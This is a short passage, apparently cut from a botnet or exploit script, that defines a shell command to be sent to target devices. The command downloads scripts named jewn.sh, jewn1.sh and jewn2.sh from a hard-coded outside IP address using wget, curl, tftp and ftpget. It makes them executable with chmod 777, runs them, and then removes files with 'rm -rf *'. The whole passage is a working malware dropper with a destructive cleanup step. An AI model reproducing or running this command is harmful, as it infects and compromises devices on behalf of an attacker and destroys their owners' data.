...
cmd="cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://188.127.237.83/jewn.sh; curl -O http://188.127.237.83/jewn.sh; chmod 777 jewn.sh; sh jewn.sh; tftp 188.127.237.83 -c get jewn.sh; chmod 777 jewn.sh; sh jewn.sh; tftp -r jewn2.sh -g 188.127.237.83; chmod 777 jewn2.sh; sh jewn2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.127.237.83 jewn1.sh jewn1.sh; sh jewn1.sh; rm -rf jewn.sh jewn.sh jewn2.sh jewn1.sh; rm -rf *" #command to send
